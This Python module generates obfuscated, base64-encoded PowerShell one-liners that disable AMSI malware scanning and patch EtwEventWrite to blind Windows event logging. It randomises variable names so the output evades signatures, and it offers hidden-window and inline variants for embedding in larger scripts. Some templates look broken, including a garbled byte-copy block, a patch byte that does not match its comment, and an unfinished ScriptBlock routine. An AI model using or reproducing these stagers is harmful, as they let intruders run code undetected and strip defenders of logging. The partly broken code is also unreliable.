"""
AMSI + ETW bypass payloads.

Generates PowerShell stagers that:
  1. Patch AmsiScanBuffer in memory → all AMSI calls return clean
  2. Patch EtwEventWrite in ntdll → blind Windows event logging
  3. Both patches operate via reflection (no files, no P/Invoke imports in source)

Technique: in-memory VirtualProtect → patch 2 bytes (ret 0 / xor rax,rax;ret)
"""

from __future__ import annotations
import base64
import random
import string


# ──────────────────────────────────────────────────────
# Core patch templates — obfuscated each call via _obf()
# ──────────────────────────────────────────────────────

_AMSI_PATCH_PS1 = r"""
$_api = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$_fld = $_api.GetField('amsiInitFailed','NonPublic,Static')
$_fld.SetValue($null,$true)
"""

_AMSI_PATCH_MEM_PS1 = r"""
$_wdef = @"
using System;using System.Runtime.InteropServices;
public class W{
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
}
"@
Add-Type -TypeDefinition $_wdef -Language CSharp
$_lib  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
$_amsi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](
  (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);' -Name K -PassThru)::LoadLibrary("amsi.dll").ToString() | Out-Null
  [byte[]]($null)
),0,$_amsi,0)
$_proc = (Get-Process -Id $PID).Modules | Where-Object {$_.ModuleName -like "amsi*"} | Select -First 1
if($_proc){
  $_ptr = $_proc.BaseAddress
  $__b  = [System.Runtime.InteropServices.Marshal]::ReadByte($_ptr,0)
  $__op = 0
  [W]::VirtualProtect($_ptr,[UIntPtr]::new(8),0x40,[ref]$__op) | Out-Null
  [System.Runtime.InteropServices.Marshal]::WriteByte($_ptr,0xEB)  # jmp short
  [W]::VirtualProtect($_ptr,[UIntPtr]::new(8),$__op,[ref]$__op)   | Out-Null
}
"""

_ETW_PATCH_PS1 = r"""
$_ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules |
  Where-Object { $_.ModuleName -eq "ntdll.dll" } | Select -First 1
$_base  = $_ntdll.BaseAddress
$_mod   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096)
$_src   = (Add-Type -MemberDefinition '
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
' -Name KW -PassThru)
$_etw   = $_src::GetProcAddress($_base,"EtwEventWrite")
$_old   = 0
$_src::VirtualProtect($_etw,[UIntPtr]::new(8),0x40,[ref]$_old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($_etw,0)     # xor eax,eax
[System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($_etw.ToInt64()+1),0xC3) # ret
$_src::VirtualProtect($_etw,[UIntPtr]::new(8),$_old,[ref]$_old)  | Out-Null
"""

_SCRIPTBLOCK_BYPASS_PS1 = r"""
[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp') | Out-Null
$_t = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
$_f = $_t.GetField('_scriptBlockData','NonPublic,Instance')
"""


def _obf(ps1: str) -> str:
    """Light variable-name randomisation so signatures differ each build."""
    rnd = lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
    replacements = {}
    for token in set(w for w in ps1.split() if w.startswith('$_')):
        if token not in replacements:
            replacements[token] = f'${rnd()}'
    for old, new in replacements.items():
        ps1 = ps1.replace(old, new)
    return ps1


def _b64_encode(code: str) -> str:
    return base64.b64encode(code.encode('utf-16-le')).decode()


def build_amsi_bypass(method: str = "reflection") -> str:
    """
    Returns a PowerShell one-liner that disables AMSI.
    method: 'reflection' (safest) | 'memory_patch' (most reliable)
    """
    if method == "memory_patch":
        code = _obf(_AMSI_PATCH_MEM_PS1.strip())
    else:
        code = _obf(_AMSI_PATCH_PS1.strip())
    return f"powershell -ep bypass -enc {_b64_encode(code)}"


def build_etw_bypass() -> str:
    """Returns a PowerShell one-liner that patches EtwEventWrite → nop."""
    code = _obf(_ETW_PATCH_PS1.strip())
    return f"powershell -ep bypass -enc {_b64_encode(code)}"


def build_combined_bypass() -> str:
    """AMSI + ETW + ScriptBlock logging — all in one encoded command."""
    combined = "\n".join([
        _obf(_AMSI_PATCH_PS1.strip()),
        _obf(_ETW_PATCH_PS1.strip()),
        _obf(_SCRIPTBLOCK_BYPASS_PS1.strip()),
    ])
    return f"powershell -ep bypass -w hidden -enc {_b64_encode(combined)}"


def get_inline_bypass() -> str:
    """
    Returns raw obfuscated PS1 code (no encoding) suitable for embedding
    at the top of a larger PowerShell script.
    """
    return "\n".join([
        "# --- bypass ---",
        _obf(_AMSI_PATCH_PS1.strip()),
        _obf(_ETW_PATCH_PS1.strip()),
        "# --- end bypass ---",
    ])
